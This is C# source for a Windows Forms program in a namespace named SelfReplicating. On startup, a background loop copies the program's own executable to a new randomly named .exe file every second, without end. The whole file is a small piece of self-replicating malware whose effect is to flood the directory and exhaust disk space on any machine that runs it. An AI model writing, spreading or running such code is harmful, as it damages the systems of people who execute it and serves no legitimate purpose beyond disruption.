using System;
using System.Diagnostics;

namespace SelfReplicating
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();

            Task.Run(() => Replicating());
        }

        public string RandomString(int length)
        {
            Random random = new Random();

            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
            return new string(Enumerable.Repeat(chars, length)
                .Select(s => s[random.Next(s.Length)]).ToArray());
        }

        async void Replicating()
        {
            string filename = System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName;

            while (true)
            {
                if (File.Exists(filename))
                {
                    string nfilename = RandomString(6) + ".exe";

                    File.WriteAllBytes(nfilename, File.ReadAllBytes(filename));

                }

                await Task.Delay(1000);
            }
        }
    }
}
